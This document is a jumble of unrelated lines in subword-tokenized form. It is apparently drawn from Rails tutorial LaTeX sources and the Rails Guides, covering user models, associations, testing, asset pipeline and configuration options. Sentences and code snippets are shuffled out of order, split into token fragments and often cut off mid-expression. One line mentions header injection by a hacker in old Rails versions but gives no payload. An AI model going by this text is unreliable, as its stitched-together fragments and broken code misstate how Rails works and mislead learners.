▁isn ' t ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / V ac u ous _ t ru th } { v ac u ous ly ▁true } ▁( and ▁similar ly ▁for ▁\ k ode { followers }) .
▁</ section >
▁as ▁show n ▁in ▁Listing ~\ ref { code : initial _ passing _ password _ tests } .
▁# ▁This ▁file ▁contains ▁settings ▁for ▁ ActionController :: P ar a m s W r app er ▁which
▁( You ▁may ▁have ▁to ▁use ▁\ text tt { Ctrl - C } ▁restart ▁the ▁local ▁web ▁server .
▁As ▁pro mis ed ▁in ▁the ▁introduction , ▁our ▁Users ▁resource ▁will ▁be ▁created ▁by ▁a ▁scaffold ▁generator ▁program , ▁which ▁comes ▁standard ▁with ▁each ▁Rails ▁project .
▁> > ▁x ▁ += ▁1
▁To ▁handle ▁an ▁upload ed ▁image ▁and ▁associate ▁it ▁with ▁the ▁Micropost ▁model , ▁we ' ll ▁use ▁the ▁\ href { https :// github ▖ com / carrierwave uploader / carrierwave } { CarrierWave } ▁image ▁ uploader .
▁A ▁mockup ▁of ▁the ▁users ▁index ▁page .
▁( - 5 ▖ ▖ 5 )▖ to _ a ▖ split ▁ { ▁| i | ▁i ▖ multiple _ of ?(
▁* ▁` config ▖ action _ view ▖ e mb ed _ authenticity _ token _ in _ remote _ form s ` ▁allows ▁you ▁to ▁set ▁the ▁default ▁behavior ▁for ▁` authenticity _ token ` ▁in ▁forms ▁with ▁`: remote ▁=> ▁true ` ▖
▁( Listing ~\ ref { code : base _ title _ test } ▁uses ▁an ▁\ emph { instance ▁variable }, ▁seen ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁covered ▁further ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁combine d ▁with ▁\ emph { string ▁inter p ol ation }, ▁which ▁is ▁covered ▁further ▁in ▁Section ~\ ref { sec : string s } ▖)
▁In ▁the ▁case ▁of ▁Listing ~\ ref { code : users _ migration }, ▁\ k ode { change } ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { create \_ table } ▁to ▁create ▁a ▁table ▁in ▁the ▁database ▁for ▁storing ▁users .
▁The ▁directory
▁ Adding ▁a ▁title ▁and ▁ head ing ▁for ▁the ▁user ▁profile ▁page .
▁image _ path (" edit ▖ png ") ▁# ▁=> ▁ / assets / edit ▖ png
▁The ▁ paginate d ▁user ▁index ▁is ▁now ▁complete , ▁but ▁there ' s ▁one ▁improve ment ▁I ▁can ' t ▁re s ist ▁including : ▁Rails ▁has ▁some ▁in c r ed i b ly ▁ s li c k ▁tool s ▁for ▁making ▁ compact ▁views , ▁and ▁in ▁this ▁section ▁we ' ll ▁refactor ▁the ▁index ▁page ▁to ▁use ▁them .
▁c ▖ first _ name ▁== ▁ o ▖ customer ▖ first _ name ▁# ▁=> ▁true
▁I ▁also ▁recommend ▁in ve st ig ating ▁the ▁site ▁m on it or ing ▁applications ▁\ href { http :// s c out app ▖ com /}{ S c out } ▁and ▁\ href { http :// www ▖ new rel ic ▖ com /}{ New ▁Re li c }
▁A lthough ▁we ' ll ▁ never ▁need ▁to ▁edit ▁it ▁in ▁the ▁main ▁tutorial , ▁an ▁example ▁of ▁adding ▁a ▁rule ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file ▁appears ▁in ▁Section ~\ ref { sec : guard }, ▁which ▁is ▁part ▁of ▁the ▁optional ▁advanced ▁testing ▁setup ▁in ▁Section ~\ ref { sec : advance d _ testing _ setup } .
▁=> ▁" 4 28 17 7 foobar "
▁To ▁summariz e , ▁the ▁Rails ▁team ▁uses ▁`: no doc : ` ▁to ▁mark ▁public ly ▁ visible ▁methods ▁and ▁classes ▁for ▁ internal ▁use ; ▁changes ▁to ▁the ▁ v is i b i l ity ▁of ▁API ▁should ▁be ▁consider ed ▁careful ly ▁and ▁discuss ed ▁over ▁a ▁pull ▁request ▁first .
▁The ▁new ▁password ▁resets ▁form ▁has ▁a ▁lot ▁in ▁common ▁with ▁Listing ~\ ref { code : login _ form _ redux } ; ▁the ▁most ▁important ▁difference s ▁are ▁the ▁use ▁of ▁a ▁different ▁resource ▁and ▁URL ▁in ▁the ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁the ▁omission ▁of ▁the ▁password ▁attribute .
▁For ▁example , ▁after ▁ s pending ▁sever al ▁hours ▁ unsuccessful ly ▁try ing ▁to ▁install ▁Ruby ▁ 2▖1 ▖ 4 ▁on ▁my ▁local ▁machine , ▁I ▁ discover ed ▁that ▁Ruby ▁ 2▖1 ▖ 5 ▁ha d ▁been ▁release d ▁the ▁day ▁before .
▁< td > <%= ▁article ▖ text ▁%></ td >
▁To ▁save ▁the ▁user ▁object ▁to ▁the ▁database , ▁we ▁call ▁the ▁\ k ode { save } ▁method ▁on ▁the ▁\ k ode { user } ▁variable :
▁That ' s ▁followed ▁by ▁some ▁t ips ▁and ▁trick s ▁for ▁working ▁with ▁associations , ▁and ▁then ▁by ▁a ▁complete ▁reference ▁to ▁the ▁methods ▁and ▁options ▁for ▁associations ▁in ▁Rails .
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active ' ▁ AND ▁" users "▖" state " ▁= ▁' finished '
▁As ▁with ▁the ▁line ▁to ▁include ▁the ▁application ▁stylesheet , ▁the ▁code ▁in ▁Listing ~\ ref { code : title _ helper } ▁may ▁look ▁simple ▁to ▁the ▁e y es ▁of ▁an ▁experience d ▁Rails ▁developer , ▁but ▁it ' s ▁\ emph { full } ▁of ▁important ▁Ruby ▁idea s : ▁module s , ▁method ▁definition , ▁optional ▁method ▁arguments , ▁comments , ▁local ▁variable ▁assignment , ▁boolean s , ▁control ▁ flow , ▁string ▁ concat en ation , ▁and ▁return ▁values .
▁ Adding ▁the ▁User ▁model ▁\ k ode { followed \_ users } ▁association .
▁Client ▖ find _ by !
▁You ▁need ▁to ▁explicitly ▁define ▁them ▁as ▁part ▁of ▁your ▁migrations .
▁# ▁Generate s ▁class ▁methods ▁to ▁access ▁@ @ emulate _ boolean s .
▁<%= ▁render ▁partial : ▁" form ", ▁local s : ▁ { zone : ▁@ zone } ▁%>
▁ Permission ▁is ▁here by ▁gra nt ed , ▁free ▁of ▁charg e , ▁to ▁any ▁person ▁obtain ing ▁a ▁copy
▁has _ one ▁: profile
▁module ▁ Dependencies
▁The ▁`: inverse _ of ` ▁option ▁specifie s ▁the ▁name ▁of ▁the ▁` has _ many ` ▁or ▁` has _ one ` ▁association ▁that ▁is ▁the ▁ inverse ▁of ▁this ▁association ▖
▁In ter pre t ation ▁of ▁the ▁output ▁of ▁ EXPLAIN ▁is ▁ beyond ▁the ▁scope ▁of ▁this ▁guide ▖
▁ Getting ▁Start ed ▁with ▁Rails ╼ = ========= ================ ╼╼
▁# ▁library
▁ ╼ ▁Load ing ▁test ▁environment
▁To ▁get ▁started , ▁users ▁\ emph { not } ▁using ▁the ▁ Cloud 9 ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁should ▁make ▁a ▁\ k ode { workspace } ▁directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁doesn ' t ▁already ▁exist ▁( Listing ~\ ref { code : mkdir _ rails _ projects }) ▁and ▁then ▁change ▁into ▁the ▁directory .
▁background - color : ▁red ;
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁see ▁an ▁example ▁where ▁REST ▁principle s ▁allow ▁us ▁to ▁model ▁a ▁ subtle r ▁problem , ▁`` following ▁users '' , ▁in ▁a ▁natural ▁and ▁convenient ▁way .
▁validates ▁: card _ number , ▁presence : ▁true , ▁if : ▁: p a id _ with _ card ?
▁$ ▁bundle ▁exec ▁ guard
▁In ▁this ▁example ,╼ it ▁would ▁make ▁sense ▁to ▁have ▁an ▁image ▁in ▁one ▁of ▁the ▁asset ▁load ▁paths , ▁such ▁as ╼` app / assets / images / image ▖ png `, ▁which ▁would ▁be ▁reference d ▁here ▖
▁* ▁In st an t i ate ▁the ▁equivalent ▁Ruby ▁object ▁of ▁the ▁appropriate ▁model ▁for ▁every ▁result ing ▁ row .
▁The ▁default ▁ XML ▁ builder ▁is ▁a ▁fresh ▁instance ▁of ▁` Builder :: X m l M ar k up ` ▖
▁ Adding ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁to ▁the ▁\ k ode { Gemfile } .
▁If ▁there ▁is ▁no ▁` ▖ erb ` ▁layout , ▁Rails ▁will ▁use ▁a ▁` ▖ builder ` ▁layout ▁if ▁one ▁exists ▖
▁With ▁most ▁of ▁the ▁options ▁to ▁` render `, ▁the ▁rendered ▁content ▁is ▁displayed ▁as ▁part ▁of ▁the ▁current ▁layout ▖
▁P lease ▁do ▁not ▁open ▁pull ▁requests ▁in ▁ doc rails , ▁if ▁you ' d ▁like ▁to ▁get ▁feedback ▁on ▁your ╼ change , ▁as k ▁for ▁it ▁in ▁[ Rails ]( http :// github ▖ com / rails / rails ) ▁instead .
▁This ▁hand y ▁command ▁creates ▁a ▁ s k e let on ▁Rails ▁application ▁in ▁a ▁directory ▁of ▁your ▁choice .
▁To ▁help ▁with ▁the ▁ tr an s it ion ▁from ▁tutorial ▁to ▁in dependent ▁development , ▁Section ~\ ref { sec : following _ co nclusion } ▁offer s ▁some ▁point ers ▁to ▁more ▁advanced ▁resources .
▁We ▁start ▁by ▁creating ▁an ▁\ k ode { update } ▁action , ▁which ▁uses ▁\ k ode { update \_ attributes } ▁( Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁update ▁the ▁user ▁base d ▁on ▁the ▁submitted ▁\ k ode { params } ▁hash , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful } .
▁message : ▁" % { value } ▁is ▁not ▁a ▁valid ▁size " ▁ }, ▁allow _ nil : ▁true
▁Note ▁that ▁Listing ~\ ref { code : password _ reset _ form } ▁uses ▁the ▁form ▁tag ▁helper
▁class ▁ Customer ▁< ▁ActiveRecord :: Base
▁You ▁can ▁override ▁this ▁and ▁explicitly ▁specify ▁the ▁primary ▁key ▁with ▁the ▁`: primary _ key ` ▁option .
▁In ▁the ▁present ▁case , ▁the ▁\ k ode { post \_ via \_ redirect } ▁method ▁( se en ▁before ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission }) ▁is ▁available ▁only ▁in ▁integration ▁tests , ▁so ▁the ▁code
▁See ╼[ M an if est ▁File s ▁and ▁D ir ec tive s ](# manifest - file s - and - directive s ) ▁for ▁more ▁details ╼ on ▁require _ tree .
▁from ▁Listing ~\ ref { code : test _ helper _ log _ in } ▁to
▁ puts ▁p ▖ name ▁# ▁" S o me ▁ Book "
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁1 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁The ▁controller ▁capture s ▁the ▁users ▁in ▁the ▁\ k ode {@ users } ▁variable , ▁which ▁is ▁passed ▁to ▁the ▁\ k ode { index } ▁view .
▁Configur ing ▁the ▁image ▁ uploader ▁for ▁production .
▁( Only ▁the ▁first ▁two ▁lines ▁above ▁are ▁ strict ly ▁necessary .
▁as ▁show n ▁in ▁Listing ~\ ref { code : adding _ the _ about _ page } .
▁| ▁` D e er ` ▁| ▁` de ers ` ▁|
▁If ▁you ▁want ▁unique ▁categories , ▁you ▁can ▁use ▁` Category ▖ joins (: articles )▖ uniq ` .
▁=> ▁[" a ", ▁" b ", ▁" c ", ▁" d ", ▁" e ", ▁" f ", ▁" g ", ▁" h ", ▁" i ", ▁" j ", ▁" k ", ▁" l ", ▁" m ", ▁" n ", ▁" o ",
▁However , ▁you ▁can ▁read ▁and ▁write ▁this ▁property , ▁if ▁you ▁e mb ed ▁the ▁code ▁directly ▁in ▁the ▁HTML ▁document ▁( as ▁it ▁happens ▁with ▁XSS )▖
▁A ar on ▁P at ter s on ' s ╼[ ha na ]( https :// github ▖ com / t end er lo ve / ha na ) ▁is ▁one ▁such ▁gem , ▁but ▁doesn ' t ▁have ╼ full ▁support ▁for ▁the ▁last ▁few ▁changes ▁in ▁the ▁specific ation .
▁" Product "▖ deconstantize ▁# ▁=> ▁" "
▁╼╼ ▁\ subsection { O ur ▁first ▁test } ▁% ▁( fold )╼ ▁\ label { sec : our _ first _ test }╼╼
▁belongs _ to ▁: assembly
▁P lease ▁check ▁` test / core _ ext / date _ ext _ test ▖ rb ` ▁in ▁the ▁Active ▁Support ▁test ▁suite ▁for ▁expected ▁behavior .
▁has _ many ▁: orders , ▁class _ name : ▁" Trans action "
▁* ▁Rails ▁4▖0 ▁introduce s ▁` ActiveSupport :: K e y G en er at or ` ▁and ▁uses ▁this ▁as ▁a ▁base ▁from ▁which ▁to ▁generate ▁and ▁verify ▁signed ▁cookies ▁( a mong ▁other ▁things )▖
▁# ▁< name > Jeremy ▁Ke mp er </ name >
▁Relationship s ▁fixtures ▁for ▁use ▁in ▁following / follower ▁tests .
▁* ▁` new _ photo _ path ` ▁returns ▁` / photos / new `
▁It ' s ▁best ▁to ▁run ▁it ▁in ▁` console ` ▁block :
▁#### ▁` transform _ value s ` ▁&& ▁` transform _ value s !`
▁You ▁can ▁use ▁the ▁` match ` ▁method ▁with ▁the ▁`: via ` ▁option ▁to ▁match ▁multiple ▁verb s ▁at ▁once :
▁There ' s ▁no ▁need ▁to ▁try ▁to ▁ sh o e h or n ▁every ▁last ▁piece ▁of ▁your ▁application ▁into ▁a ▁resource ful ▁framework ▁if ▁that ' s ▁not ▁a ▁good ▁fit .
▁A nother ▁important ▁feature ▁of ▁a ▁blog ▁is ▁being ▁able ▁to ▁delete ▁ s p a m ▁comments ▖
▁class ▁G oodnessValidator ▁< ▁ ActiveModel :: Validator
▁ ╼ / db /* ▖ sqlite 3 ╼ / db /* ▖ sqlite 3- j our n al ╼╼ # ▁I gnore ▁all ▁log file s ▁and ▁te mp file s .
▁$("# new _ article ")▖ on (" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁A ▁mockup ▁of ▁the ▁result --- users , ▁pagination ▁links , ▁and ▁a ▁`` Users '' ▁navigation ▁link --- app e ar s ▁in ▁Figure ~\ ref { fig : user _ index _ mockup }
▁The ▁` add ` ▁method ▁let s ▁you ▁manually ▁add ▁messages ▁that ▁are ▁related ▁to ▁particular ▁attributes ▖
▁is ▁invalid ▁because ▁of ▁the ▁hyphen s .
▁ { enumerate }╼╼\ begin { code listing }╼\ label { code : palindrome _ test er }╼\ code caption { A ▁simple ▁test er ▁for ▁ palindrome s ▖ } ╼ %= ▁ lang : i rb ╼\ begin { code } ╼ > > ▁def ▁ palindrome _ test er ( s )╼ > > ▁if ▁ FILL _ IN ╼ > > ▁ puts ▁" It ' s ▁a ▁ palindrome !" ╼ > > ▁else ╼ > > ▁ puts ▁" It ' s ▁not ▁a ▁ palindrome ▖ " ╼ > > ▁end ╼ > > ▁end ╼\ end { code }╼\ end { code listing }╼╼ ▁\ subsection { Back ▁to ▁the ▁title ▁helper } ▁% ▁( fold )╼ ▁\ label { sec : back _ to _ the _ title _ helper }╼╼ We ▁are ▁now ▁in ▁a ▁position ▁to ▁understand ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper }, \ foot note {
▁ //= ▁require _ tree ▁ .
▁ Integration ▁tests ▁are ▁es pecially ▁powerful , ▁as ▁they ▁allow ▁us ▁to ▁simul ate ▁the ▁actions ▁of ▁a ▁user ▁interact ing ▁with ▁our ▁application ▁using ▁a ▁web ▁browser .
▁javascript _ tag ▁" alert (' A ll ▁is ▁good ') "
▁A ▁view ' s ▁purpose ▁is ▁to ▁display ▁this ▁information ▁in ▁a ▁ human ▁read able ▁format ▖
▁* ▁How ▁to ▁c her ry - pick ▁just ▁the ▁extensions ▁you ▁want .
▁The ▁first ▁of ▁these ▁was ▁included ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration } ▁via ▁\ k ode { belongs \_ to ▁: user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user } .
▁One ▁thing ▁that ▁can ▁help ▁is ▁` and ▁return ` ▖
▁By ▁the ▁end ▁of ▁the ▁\ emph { Rails ▁Tutorial }, ▁you ' ll ▁know ▁all ▁the ▁most ▁important ▁one s .
▁ K eep ▁in ▁mind ▁the ▁order ▁of ▁these ▁pre process or s ▁is ▁important ▖
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁ com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ page _ content _ spec } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( some times ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁The ▁\ k ode { bundle ▁install } ▁command ▁m ight ▁take ▁a ▁few ▁moment s , ▁but ▁when ▁it ' s ▁done ▁our ▁application ▁will ▁be ▁ready ▁to ▁run .
▁in ▁Listing ~\ ref { code : new _ edit _ partial } .
▁association _ foreign _ key : ▁" other _ user _ id "
▁A ▁ safe ▁string ▁is ▁one ▁that ▁is ▁ marked ▁as ▁being ▁insert able ▁into ▁HTML ▁as ▁is ▖
▁In ▁other ▁words , ▁the ▁first ▁example ▁above ▁could ▁replace ▁\ k ode { str } ▁with ▁any ▁other ▁valid ▁variable ▁name , ▁such ▁as ▁\ k ode { the \_ function \_ argument }, ▁and ▁it ▁would ▁work ▁just ▁the ▁same :
▁And ▁due ▁to ▁a ▁bug ▁in ▁( Ruby ▁and ) ▁Rails ▁up ▁to ▁version ▁ 2▖1 ▖ 2 ▁( ex clu d ing ▁it ), ▁a ▁ha c k er ▁may ▁ inject ▁arbitrar y ▁header ▁fields ; ▁for ▁example ▁like ▁this :
▁belongs _ to ▁: customer , ▁ touch : ▁: orders _ updated _ at
▁* ▁` ActiveSupport :: Cache :: Store ▖ logger ` ▁specifie s ▁the ▁ logger ▁to ▁use ▁within ▁cache ▁store ▁operations .
▁``` ruby
▁Using ▁the ▁\ k ode { belongs \_ to } / \ k ode { has \_ many } ▁association ▁defined ▁in ▁this ▁section , ▁\ line break ▁Rails ▁construct s ▁the ▁methods ▁show n ▁in ▁Table ~\ ref { table : association _ methods } .
▁We ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following } ▁how ▁to ▁use ▁the ▁Relationship ▁model ▁to ▁simul ate ▁both ▁Active ▁Relationship ▁and ▁Pass ive ▁Relationship ▁models .
▁Verify ▁that ▁a ▁ logout ▁link ▁appears
▁We ' ve ▁already ▁defined ▁a ▁\ k ode { digest } ▁method ▁for ▁use ▁in ▁the ▁test ▁fixtures ▁( Listing ~\ ref { code : digest _ method }), ▁and ▁we ▁can ▁use ▁the ▁results ▁of ▁the ▁discussion ▁above ▁to ▁create ▁a ▁\ k ode { new \_ token } ▁method ▁to ▁create ▁a ▁new ▁token .
▁self ▖ emulate _ boolean s ▁= ▁true
▁A lthough ▁our ▁user ▁following ▁implementation ▁is ▁complete ▁as ▁it ▁stand s , ▁we ▁have ▁one ▁bit ▁of ▁polish ▁left ▁to ▁add ▁before ▁starting ▁work ▁on ▁the ▁status ▁feed .
▁Implement ing ▁one ▁or ▁more ▁of ▁these ▁application ▁extensions ▁will ▁help ▁you ▁make ▁the ▁ tr an s it ion ▁from ▁following ▁a ▁tutorial ▁to ▁writing ▁original ▁applications ▁of ▁your ▁own .
▁The ▁problem ▁with ▁the ▁code ▁in ▁Section ~\ ref { sec : a _ first _ feed _ implementation } ▁is ▁that ▁\ k ode { following \_ id s } ▁pull s ▁\ emph { all } ▁the ▁followed ▁users ' ▁id s ▁into ▁memory , ▁and ▁creates ▁an ▁array ▁the ▁full ▁length ▁of ▁the ▁followed ▁users ▁array .
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁a ▁base ▁title ▖
▁* ▁These ▁equivalent ▁methods ▁may ▁not ▁execute ▁the ▁same ▁SQL ▁as ▁the ▁previous ▁implementation .
▁Inde ed , ▁this ▁situation ▁is ▁confusing ▁enough ▁that ▁a ▁popular ▁[ article ]( http :// web log ▖ ja mis b u c k ▖ org / 200 7 / 2 / 5 / n est ing - resources ) ▁by ▁ J a mis ▁B u c k ▁pro po s es ▁a ▁rule ▁of ▁thumb ▁for ▁good ▁Rails ▁design :
▁This ▁is ▁for ▁the ▁benefit ▁of ▁the ▁\ k ode { change } ▁method , ▁which ▁take s ▁as ▁arguments ▁an ▁object ▁and ▁a ▁symbol ▁and ▁then ▁calculat es ▁the ▁result ▁of ▁calling ▁that ▁symbol ▁as ▁a ▁method ▁on ▁the ▁object ▁both ▁before ▁and ▁after ▁the ▁block .
▁Find ing ▁a ▁user ▁to ▁follow .
▁ umerate }╼╼ ▁% ▁subsection ▁a _ working _ follow _ button _ with _ ajax ▁( end )╼╼ ▁\ subsection { Follow ing ▁tests } ▁% ▁( fold )╼ ▁\ label { sec : following _ tests }╼╼
▁We ' ll ▁start ▁with ▁a ▁couple ▁of ▁tests ▁in v ol v ing ▁collection s ▁of ▁valid ▁and ▁invalid ▁addresses .
▁At ▁this ▁point , ▁the ▁tests ▁are ▁\ passing :
▁ W IP : ▁ Not ▁all ▁the ▁helpers ▁are ▁list ed ▁here ▖
▁The ▁ railties ▁test ▁suite ▁in ▁particular ▁take s ▁a ▁long ▁time , ▁and ▁even ╼ more ▁if ▁the ▁source ▁code ▁is ▁m o un ted ▁in ▁` / v a gr an t ` ▁as ▁happens ▁in ▁the ▁recommended ╼ work flow ▁with ▁the ▁[ rails - dev - box ]( https :// github ▖ com / rails / rails - dev - box ) .
▁* ▁` config ▖ active _ record ▖ dump _ schema _ after _ migration ` ▁is ▁a ▁flag ▁which ╼ ▁control s ▁whether ▁or ▁not ▁ schema ▁ dump ▁should ▁happen ▁( ` db / schema ▖ rb ` ▁or ╼ ▁` db / structure ▖ sql ` ) ▁when ▁you ▁run ▁migrations ▖
▁S ublime ▁Text ▁is ▁heav ily ▁i nfluence d ▁by ▁\ href { http :// macro m ate s ▖ com } { TextMate }, ▁and ▁in ▁fact ▁is ▁ com p at ible ▁with ▁most ▁ TextMate ▁customizations , ▁such ▁as ▁ s n ip pe t s ▁and ▁ color ▁ scheme s .
▁* ▁` ar ound _ enqueue `
▁There ▁is ▁a ▁second ▁popular ▁template ▁system ▁called ▁\ href { http :// ha m l - lang ▖ com /}{ H a m l }, ▁which ▁I ▁person ally ▁ lo ve , ▁but ▁it ' s ▁not ▁\ emph { q uite } ▁standard ▁enough ▁yet ▁for ▁use ▁in ▁an ▁introduc to ry ▁tutorial .
▁* ▁` config ▖ active _ support ▖ time _ precision ` ▁set s ▁the ▁ precision ▁of ▁JSON ▁ en code d ▁time ▁values ▖
▁To ▁make ▁a ▁\ k ode { followed \_ users } ▁array ▁of ▁users , ▁it ▁would ▁be ▁possible ▁to ▁pull ▁out ▁an ▁array ▁of ▁\ k ode { followed \_ id } ▁attributes ▁and ▁then ▁find ▁the ▁user ▁for ▁each ▁one .
▁#### ▁` find _ each `
▁\ chapter { User ▁microposts }╼\ label { cha : user _ microposts }╼╼
▁date ▖ end _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 59 : 59 ▁+0200 ▁2010
▁<%= ▁f ▖ text _ field ▁: comment er ▁%>
▁Cucumber ▁features ▁are ▁easily ▁read able , ▁but ▁they ▁are ▁entire ly ▁separate ▁from ▁the ▁code ▁that ▁implement s ▁them --- a ▁property ▁that ▁ cut s ▁both ▁ways .
▁There ▁are ▁time s ▁when ▁you ▁m ight ▁like ▁to ▁change ▁this , ▁and ▁you ▁can ▁do ▁so ▁by ▁setting ▁the ▁`: content _ type ` ▁option :
▁The ▁solution ▁is ▁to ▁filter ▁the ▁ backtrace ▁to ▁eliminate ▁un w an ted ▁lines .
▁The ▁` has _ many ` ▁association ▁creates ▁a ▁one - to - many ▁relationship ▁with ▁another ▁model ▖
▁Because ▁the ▁\ k ode { account \_ activation } ▁method ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation } ▁requires ▁a ▁valid ▁user ▁object ▁as ▁an ▁argument , ▁the ▁code ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } ▁won ' t ▁work ▁as ▁written .
▁\ emph { Hint } : ▁Add ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : layout _ links _ test } ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper .
▁as ▁show n ▁in ▁Listing ~\ ref { code : puma _ gemfile } .
▁[ * object ]
▁client ▁= ▁Client ▖ take (2)
▁For ╼ a ▁full ▁list ▁of ▁all ▁available ▁options , ▁please ▁have ▁a ▁look ▁further ▁down ▁at ▁the ╼ Co mp let e ▁ List ▁of ▁Action ▁Mailer ▁user - set table ▁attributes ▁section .
▁( If ▁the ▁command ▁in ▁Listing ~\ ref { code : rails _ command } ▁returns ▁an ▁error ▁like ▁`` Co ul d ▁not ▁find ▁' railties '' ', ▁it ▁means ▁you ▁don ' t ▁have ▁the ▁right ▁version ▁of ▁Rails ▁installed , ▁and ▁you ▁should ▁double - check ▁that ▁you ▁followed ▁the ▁command ▁in ▁Listing ~\ ref { code : installing _ rails } ▁exactly ▁as ▁written ▖)
▁( Listing ~\ ref { code : friendly _ forwarding _ test } ▁also ▁remove s ▁the ▁test ▁for ▁rendering ▁the ▁edit ▁template ▁since ▁that ' s ▁no ▁longer ▁the ▁expected ▁behavior ▖)
▁</ p >
▁The ▁result ing ▁clean ed - up ▁views ▁appear ▁in ▁Listing ~\ ref { code : home _ view _ interior }, ▁Listing ~\ ref { code : help _ view _ interior }, ▁and ▁Listing ~\ ref { code : about _ view _ interior } .
▁ Adding ▁this ▁in ▁a ▁default ▁scope ▁for ▁the ▁Micropost ▁model ▁gives ▁Listing ~\ ref { code : micropost _ ordering } .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁from ▁Listing ~\ ref { code : initial _ edit _ action }, ▁the ▁edit ▁page ▁should ▁render ▁properly , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : edit _ page } .
▁A ▁new ▁password ▁reset ▁view .
▁### ▁I 18 n ▁enforc ing ▁available ▁ locales
▁Extensions ▁to ▁` Regexp `
▁B oth ▁kind s ▁of ▁ dependencies ▁will ▁be ▁installed ▁when ▁` bundle ▁install ` ▁is ▁run ▁inside ╼ of ▁the ▁application ▖
▁Tests ▁for ▁the ▁micropost ' s ▁user ▁association .
▁in ▁Listing ~\ ref { code : user _ factory } .
▁To ▁get ▁the ▁layout ▁to ▁work , ▁we ▁have ▁to ▁replace ▁the ▁default ▁title ▁with ▁the ▁ embedded ▁Ruby ▁from ▁the ▁examples ▁above :
▁ INNER ▁JOIN ▁articles ▁ ON ▁articles ▖ category _ id ▁= ▁categories ▖ id
▁% w ( a ▁b ▁c ▁d )▖ from (2) ▁# ▁=> ▁% w ( c ▁d )
▁If ▁you ▁have ▁an ▁instance ▁of ▁the ▁` Picture ` ▁model , ▁you ▁can ▁get ▁to ▁its ▁ parent ▁via ▁`@ picture ▖ image able ` ▖
▁has _ many ▁: through ▁Association ▁D iagram ]( images / has _ many _ through ▖ png )
▁is ▁a ▁call ▁to ▁this ▁function .
▁Code ▁to ▁ seed ▁the ▁following ▁relationships ▁appear ▁in ▁Listing ~\ ref { code : sample _ relationships } .
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all " ▁%>
▁> > ▁Rails ▖ env ▖ test ?
▁ Show ing ▁hidden ▁files ▁in ▁the ▁file ▁ navigator .
▁Sometimes ,╼ the ▁ core ▁team ▁will ▁have ▁to ▁make ▁a ▁ j u d gem ent ▁call ▖
▁self ▖ class _ eval ▁% {
▁in ▁Listing ~\ ref { code : full _ feed _ test } .
▁errors ▖ add (: name , ▁" cannot ▁contain ▁the ▁characters ▁ !
▁# ▁I gnore ▁all ▁log file s ▁and ▁te mp file s .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / range / include _ range ▖ rb ` .
▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ forget } .
▁So ▁far , ▁we ▁have n ' t ▁ touch ed ▁the ▁database : ▁\ k ode { User ▖ new } ▁only ▁creates ▁an ▁object ▁\ emph { in ▁memory }, ▁while ▁\ k ode { user ▖ valid ?}\ ▁me re ly ▁check s ▁to ▁see ▁if ▁the ▁object ▁is ▁valid .
▁To ▁disable ▁the ▁assets ▁cache ▁store :
▁Note ▁the ▁use ▁of ▁HTML ▁es c a p ing ▁via ▁\ k ode { C G I ▖ escape HTML } ; ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why ▁this ▁is ▁necessary .
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` transform _ value s !` ▁that ▁applies ▁the ▁block ▁operations ▁to ▁values ▁in ▁the ▁very ▁receiver .
▁ rescue
▁$ ▁c p ▁README ▖ rdoc ▁README ▖ md
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : remember _ tests }, ▁this ▁design ▁( with ▁a ▁little ▁refactoring ) ▁will ▁also ▁make ▁the ▁authentication ▁machinery ▁easier ▁to ▁test .
▁The ▁final ▁sample ▁application ▁will ▁be ar ▁more ▁than ▁a ▁passing ▁resembl ance ▁to ▁a ▁certain ▁popular ▁\ href { http :// twitter ▖ com /}{ so cial ▁ micro b logging ▁site } --- a ▁site ▁which , ▁co in cidentally , ▁was ▁also ▁original ly ▁written ▁in ▁Rails .
